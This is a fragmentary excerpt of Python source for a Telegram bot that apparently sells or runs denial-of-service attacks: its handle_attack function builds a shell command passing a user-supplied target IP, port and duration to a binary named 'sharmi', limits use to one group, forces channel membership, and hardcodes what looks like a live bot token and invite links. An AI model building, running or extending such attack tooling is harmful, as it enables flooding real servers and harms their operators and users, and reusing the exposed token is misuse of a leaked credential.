...
bot = telebot.TeleBot('7344773060:AAF7tnDlHJc8xNq8s4sVi-FwKOVxkZdlSUM')
...
GROUP_ID = "-1002488661685"
CHANNEL_USERNAME = "@Vicky_oct_2k10"
...
def handle_attack(message):
    ...
    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, f"🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌\n🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖:https://t.me/+ZYs78w5fvIZmNWE1 {CHANNEL_USERNAME}")
        return
    ...
    full_command = f"./sharmi {target} {port} {time_duration}"
    ...
    try:
        ...
        if user_status not in ['member', 'administrator', 'creator']:
            bot.reply_to(message, f"❌ **𝐘𝐨𝐮 𝐌𝐔𝐒𝐓 𝐉𝐎𝐈𝐍 𝐎𝐔𝐑 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐅𝐈𝐑𝐒𝐓!**\n"
                                  f"🔗 **𝐉𝐨𝐢𝐧 𝐇𝐞𝐫𝐞:** [Click Here](https://t.me/+ZYs78w5fvIZmNWE1{CHANNEL_USERNAME})")
            return  
...
👉 [𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙂𝙧𝙤𝙪𝙥](https://t.me/+ZYs78w5fvIZmNWE1) 🚀🔥"""
